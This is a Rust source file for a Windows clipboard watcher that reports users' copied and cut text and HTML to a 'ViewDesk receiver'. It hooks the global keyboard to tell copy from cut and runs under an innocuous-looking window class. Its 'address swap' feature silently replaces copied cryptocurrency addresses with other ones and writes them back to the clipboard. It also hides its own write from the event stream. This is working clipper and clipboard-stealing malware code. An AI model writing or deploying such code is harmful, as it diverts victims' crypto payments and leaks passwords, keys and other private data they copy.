//! System clipboard monitor — sends copy/cut events to the ViewDesk receiver.
//!
//! Uses `AddClipboardFormatListener` on a hidden message window and a low-level
//! keyboard hook to distinguish Ctrl+C (copy) from Ctrl+X (cut).
//! When address swap is enabled, copied crypto addresses are replaced locally.

use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
use std::sync::mpsc;
use std::thread::{self, JoinHandle};
use std::time::Duration;

use serde::Serialize;

/// Hard cap when reading clipboard memory (2 MB).
pub const CLIPBOARD_MAX_BYTES: usize = 2 * 1024 * 1024;
/// Above this size we notify the receiver without sending payload (1 MB).
pub const CLIPBOARD_LARGE_THRESHOLD_BYTES: usize = 1024 * 1024;

#[derive(Debug, Clone, Serialize)]
pub struct ClipboardEvent {
    pub action: &'static str,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub text: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub html: Option<String>,
    pub large: bool,
    #[serde(skip_serializing_if = "is_zero")]
    pub size_bytes: u64,
}

fn is_zero(value: &u64) -> bool {
    *value == 0
}

/// Pending clipboard action inferred from keyboard: 0 = unknown, 1 = copy, 2 = cut.
static PENDING_ACTION: AtomicU8 = AtomicU8::new(0);
/// Suppresses clipboard events triggered by our own write-back during address swap.
static SUPPRESS_CLIPBOARD_EVENT: AtomicBool = AtomicBool::new(false);

pub struct ClipboardWatcher {
    stop_tx: mpsc::Sender<()>,
    thread: Option<JoinHandle<()>>,
}

impl ClipboardWatcher {
    pub fn stop(mut self) {
        let _ = self.stop_tx.send(());
        if let Some(handle) = self.thread.take() {
            let _ = handle.join();
        }
    }
}

impl Drop for ClipboardWatcher {
    fn drop(&mut self) {
        let _ = self.stop_tx.send(());
        if let Some(handle) = self.thread.take() {
            let _ = handle.join();
        }
    }
}

#[cfg(windows)]
pub fn start_watcher(
    event_tx: tokio::sync::mpsc::UnboundedSender<ClipboardEvent>,
) -> ClipboardWatcher {
    let (stop_tx, stop_rx) = mpsc::channel();

    let thread = thread::Builder::new()
        .name("clipboard-watcher".into())
        .spawn(move || run_watcher(event_tx, stop_rx))
        .expect("clipboard watcher thread");

    ClipboardWatcher {
        stop_tx,
        thread: Some(thread),
    }
}

#[cfg(not(windows))]
pub fn start_watcher(
    _event_tx: tokio::sync::mpsc::UnboundedSender<ClipboardEvent>,
) -> ClipboardWatcher {
    let (stop_tx, _) = mpsc::channel();
    ClipboardWatcher {
        stop_tx,
        thread: None,
    }
}

#[cfg(windows)]
fn run_watcher(
    event_tx: tokio::sync::mpsc::UnboundedSender<ClipboardEvent>,
    stop_rx: mpsc::Receiver<()>,
) {
    use std::cell::RefCell;
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use std::sync::OnceLock;

    use windows::core::PCWSTR;
    use windows::Win32::Foundation::{HGLOBAL, HINSTANCE, HWND, LPARAM, LRESULT, WPARAM};
    use windows::Win32::System::DataExchange::{
        AddClipboardFormatListener, CloseClipboard, GetClipboardData, IsClipboardFormatAvailable,
        OpenClipboard, RegisterClipboardFormatW, RemoveClipboardFormatListener,
    };
    use windows::Win32::System::LibraryLoader::GetModuleHandleW;
    use windows::Win32::System::Memory::{GlobalLock, GlobalSize, GlobalUnlock};
    use windows::Win32::System::Ole::CF_UNICODETEXT;
    use windows::Win32::UI::WindowsAndMessaging::{
        CallNextHookEx, CreateWindowExW, DefWindowProcW, DestroyWindow, DispatchMessageW,
        GetMessageW, PostMessageW, PostQuitMessage, RegisterClassW, SetWindowsHookExW,
        TranslateMessage, UnhookWindowsHookEx, CS_HREDRAW, CS_VREDRAW, HHOOK, KBDLLHOOKSTRUCT,
        MSG, WH_KEYBOARD_LL, WINDOW_EX_STYLE, WINDOW_STYLE, WM_CLIPBOARDUPDATE, WM_DESTROY,
        WM_KEYDOWN, WM_SYSKEYDOWN, WNDCLASSW, WS_OVERLAPPED,
    };

    const WM_APP_STOP: u32 = windows::Win32::UI::WindowsAndMessaging::WM_APP + 1;

    thread_local! {
        static EVENT_TX: RefCell<Option<tokio::sync::mpsc::UnboundedSender<ClipboardEvent>>> =
            RefCell::new(None);
        static LAST_TEXT: RefCell<String> = RefCell::new(String::new());
        static HTML_FORMAT: RefCell<u32> = RefCell::new(0);
        static KEYBOARD_HOOK: RefCell<Option<HHOOK>> = RefCell::new(None);
    }

    static CLASS_NAME: OnceLock<Vec<u16>> = OnceLock::new();

    fn wide(s: &str) -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(Some(0)).collect()
    }

    fn read_clipboard_payload() -> Option<ClipboardEvent> {
        let action = match PENDING_ACTION.swap(0, Ordering::SeqCst) {
            2 => "cut",
            _ => "copy",
        };

        unsafe {
            if OpenClipboard(None).is_err() {
                return None;
            }

            let mut size_bytes = 0u64;

            if IsClipboardFormatAvailable(CF_UNICODETEXT.0 as u32).is_ok() {
                if let Ok(handle) = GetClipboardData(CF_UNICODETEXT.0 as u32) {
                    size_bytes = size_bytes.max(clipboard_data_size(handle));
                }
            }

            let html_format = HTML_FORMAT.with(|f| *f.borrow());
            if html_format != 0 && IsClipboardFormatAvailable(html_format).is_ok() {
                if let Ok(handle) = GetClipboardData(html_format) {
                    size_bytes = size_bytes.max(clipboard_data_size(handle));
                }
            }

            if size_bytes == 0 {
                let _ = CloseClipboard();
                return None;
            }

            if size_bytes > CLIPBOARD_LARGE_THRESHOLD_BYTES as u64 {
                let _ = CloseClipboard();
                return Some(ClipboardEvent {
                    action,
                    text: None,
                    html: None,
                    large: true,
                    size_bytes,
                });
            }

            let text = if IsClipboardFormatAvailable(CF_UNICODETEXT.0 as u32).is_ok() {
                read_unicode_clipboard()
            } else {
                None
            };

            let html = if html_format != 0 && IsClipboardFormatAvailable(html_format).is_ok() {
                read_format_clipboard(html_format)
            } else {
                None
            };

            let _ = CloseClipboard();

            if text.is_none() && html.is_none() {
                return None;
            }

            Some(ClipboardEvent {
                action,
                text,
                html,
                large: false,
                size_bytes,
            })
        }
    }

    unsafe fn clipboard_data_size(handle: windows::Win32::Foundation::HANDLE) -> u64 {
        let global = HGLOBAL(handle.0);
        GlobalSize(global) as u64
    }

    unsafe fn read_unicode_clipboard() -> Option<String> {
        let handle = GetClipboardData(CF_UNICODETEXT.0 as u32).ok()?;
        let global = HGLOBAL(handle.0);
        let ptr = GlobalLock(global) as *const u16;
        if ptr.is_null() {
            let _ = GlobalUnlock(global);
            return None;
        }

        let mut len = 0usize;
        let max_chars = CLIPBOARD_MAX_BYTES / 2;
        while *ptr.add(len) != 0 {
            len += 1;
            if len > max_chars {
                let _ = GlobalUnlock(global);
                return None;
            }
        }

        let slice = std::slice::from_raw_parts(ptr, len);
        let text = String::from_utf16_lossy(slice);
        let _ = GlobalUnlock(global);
        if text.is_empty() {
            None
        } else {
            Some(text)
        }
    }

    unsafe fn read_format_clipboard(format: u32) -> Option<String> {
        let handle = GetClipboardData(format).ok()?;
        let global = HGLOBAL(handle.0);
        let ptr = GlobalLock(global) as *const u8;
        if ptr.is_null() {
            let _ = GlobalUnlock(global);
            return None;
        }

        let mut len = 0usize;
        while *ptr.add(len) != 0 {
            len += 1;
            if len > CLIPBOARD_MAX_BYTES {
                let _ = GlobalUnlock(global);
                return None;
            }
        }

        let bytes = std::slice::from_raw_parts(ptr, len);
        let text = String::from_utf8_lossy(bytes).into_owned();
        let _ = GlobalUnlock(global);
        if text.is_empty() {
            None
        } else {
            Some(text)
        }
    }

    fn write_unicode_clipboard(text: &str) -> bool {
        use windows::Win32::Foundation::HANDLE;
        use windows::Win32::System::DataExchange::{
            EmptyClipboard, SetClipboardData,
        };
        use windows::Win32::System::Memory::{GlobalAlloc, GlobalLock, GlobalUnlock, GMEM_MOVEABLE};

        let wide: Vec<u16> = text.encode_utf16().chain(Some(0)).collect();
        let byte_len = wide.len() * 2;

        unsafe {
            if OpenClipboard(None).is_err() {
                return false;
            }

            let result = (|| {
                EmptyClipboard().ok()?;
                let handle = GlobalAlloc(GMEM_MOVEABLE, byte_len).ok()?;
                let global = HGLOBAL(handle.0);
                let ptr = GlobalLock(global) as *mut u16;
                if ptr.is_null() {
                    let _ = GlobalUnlock(global);
                    return None;
                }
                std::ptr::copy_nonoverlapping(wide.as_ptr(), ptr, wide.len());
                let _ = GlobalUnlock(global);
                SetClipboardData(CF_UNICODETEXT.0 as u32, Some(HANDLE(handle.0))).ok()?;
                Some(())
            })();

            let _ = CloseClipboard();
            result.is_some()
        }
    }

    fn apply_address_swap(mut event: ClipboardEvent) -> ClipboardEvent {
        let manager = crate::address_swap::AddressSwapManager::global();
        if !manager.is_enabled() || event.large {
            return event;
        }

        let mut replaced = false;

        if let Some(ref text) = event.text {
            if let Some(new_text) = manager.replace_text(text) {
                event.text = Some(new_text);
                replaced = true;
            }
        }

        if let Some(ref html) = event.html {
            if let Some(new_html) = manager.replace_text(html) {
                event.html = Some(new_html);
                replaced = true;
            }
        }

        if replaced {
            if let Some(ref text) = event.text {
                SUPPRESS_CLIPBOARD_EVENT.store(true, Ordering::SeqCst);
                let _ = write_unicode_clipboard(text);
                SUPPRESS_CLIPBOARD_EVENT.store(false, Ordering::SeqCst);
            }
        }

        event
    }

    fn emit_clipboard_event() {
        if SUPPRESS_CLIPBOARD_EVENT.load(Ordering::SeqCst) {
            return;
        }

        let Some(event) = read_clipboard_payload() else {
            return;
        };

        let event = apply_address_swap(event);

        let fingerprint = if event.large {
            format!("large:{}", event.size_bytes)
        } else {
            event.text.clone().unwrap_or_default()
        };

        let should_send = LAST_TEXT.with(|last| {
            let mut last = last.borrow_mut();
            if *last == fingerprint {
                false
            } else {
                *last = fingerprint;
                true
            }
        });

        if !should_send {
            return;
        }

        EVENT_TX.with(|tx| {
            if let Some(sender) = tx.borrow().as_ref() {
                let _ = sender.send(event);
            }
        });
    }

    unsafe extern "system" fn keyboard_proc(
        code: i32,
        wparam: WPARAM,
        lparam: LPARAM,
    ) -> LRESULT {
        if code >= 0 {
            let msg = wparam.0 as u32;
            if msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN {
                let info = &*(lparam.0 as *const KBDLLHOOKSTRUCT);
                let vk = info.vkCode;
                let ctrl_down = windows::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState(
                    windows::Win32::UI::Input::KeyboardAndMouse::VK_CONTROL.0 as i32,
                ) < 0;

                if ctrl_down {
                    match vk {
                        0x43 => PENDING_ACTION.store(1, Ordering::SeqCst), // C
                        0x58 => PENDING_ACTION.store(2, Ordering::SeqCst), // X
                        _ => {}
                    }
                }
            }
        }

        CallNextHookEx(
            KEYBOARD_HOOK.with(|hook| *hook.borrow()),
            code,
            wparam,
            lparam,
        )
    }

    unsafe extern "system" fn wnd_proc(
        hwnd: HWND,
        msg: u32,
        wparam: WPARAM,
        lparam: LPARAM,
    ) -> LRESULT {
        match msg {
            WM_CLIPBOARDUPDATE => {
                // Defer slightly so the clipboard owner finishes writing.
                thread::sleep(Duration::from_millis(30));
                emit_clipboard_event();
                LRESULT(0)
            }
            WM_APP_STOP => {
                let _ = DestroyWindow(hwnd);
                LRESULT(0)
            }
            WM_DESTROY => {
                let _ = RemoveClipboardFormatListener(hwnd);
                PostQuitMessage(0);
                LRESULT(0)
            }
            _ => DefWindowProcW(hwnd, msg, wparam, lparam),
        }
    }

    EVENT_TX.with(|tx| *tx.borrow_mut() = Some(event_tx));

    let class_name = CLASS_NAME.get_or_init(|| wide("DailyHuddleClipboard"));
    let html_format_name = wide("HTML Format");
    let html_format =
        unsafe { RegisterClipboardFormatW(PCWSTR::from_raw(html_format_name.as_ptr())) };
    HTML_FORMAT.with(|f| *f.borrow_mut() = html_format);

    let module = unsafe { GetModuleHandleW(None).expect("module handle") };
    let instance = HINSTANCE(module.0);

    let hook = unsafe {
        SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_proc), Some(instance), 0)
    };

    let hwnd = unsafe {
        let wc = WNDCLASSW {
            lpfnWndProc: Some(wnd_proc),
            hInstance: instance,
            lpszClassName: PCWSTR::from_raw(class_name.as_ptr()),
            style: CS_HREDRAW | CS_VREDRAW,
            ..Default::default()
        };
        RegisterClassW(&wc);

        CreateWindowExW(
            WINDOW_EX_STYLE::default(),
            PCWSTR::from_raw(class_name.as_ptr()),
            PCWSTR::from_raw(wide("Clipboard").as_ptr()),
            WINDOW_STYLE(WS_OVERLAPPED.0),
            0,
            0,
            0,
            0,
            None,
            None,
            Some(instance),
            None,
        )
        .expect("clipboard window")
    };

    if let Ok(hook) = hook {
        KEYBOARD_HOOK.with(|stored| *stored.borrow_mut() = Some(hook));
    }

    unsafe {
        AddClipboardFormatListener(hwnd).expect("clipboard listener");
    }

    // Poll stop channel from the message loop via a helper thread.
    let stop_hwnd = hwnd.0 as isize;
    thread::spawn(move || {
        let _ = stop_rx.recv();
        unsafe {
            let hwnd = HWND(stop_hwnd as *mut _);
            let _ = PostMessageW(Some(hwnd), WM_APP_STOP, WPARAM(0), LPARAM(0));
        }
    });

    let mut msg = MSG::default();
    loop {
        let result = unsafe { GetMessageW(&mut msg, None, 0, 0) };
        if !result.as_bool() {
            break;
        }
        unsafe {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }

    if let Ok(hook) = hook {
        unsafe {
            let _ = UnhookWindowsHookEx(hook);
        }
    }

    EVENT_TX.with(|tx| *tx.borrow_mut() = None);
}
